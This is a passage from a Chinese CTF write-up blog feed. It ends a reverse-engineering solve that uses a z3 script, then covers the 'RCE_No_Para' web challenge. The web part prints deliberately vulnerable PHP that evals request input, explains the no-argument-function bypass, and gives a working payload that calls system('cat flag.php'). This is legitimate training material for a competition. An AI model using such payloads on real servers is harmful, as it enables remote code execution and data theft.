t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">            t1.start()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag == Happy:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Good job!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;No no no!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f = [BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">flag = f[:]</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_1</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_2</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">    t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x.add(flag[k]==Happy[k])</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        m = x.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[f[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f))]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># He110_cazy</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;He110_cazy&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>第一层正则表达式为递归匹配只含字母、数字、下划线的无参函数，如 <code>a(b_c());</code>，第二层要求不能包含 <code>session|end|next|header|dir</code> 关键字，使用 <code>get_defined_vars()</code> 可从请求中向 <code>$_GET</code> 传入所需执行的函数，由于 <code>end</code> 和 <code>next</code> 不能使用，可使用 <code>reset</code> 和 <code>array_reverse</code> 调整数组与取值，再利用 <code>eval</code> 命令执行。</p><p>payload：<code>?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
</feed>
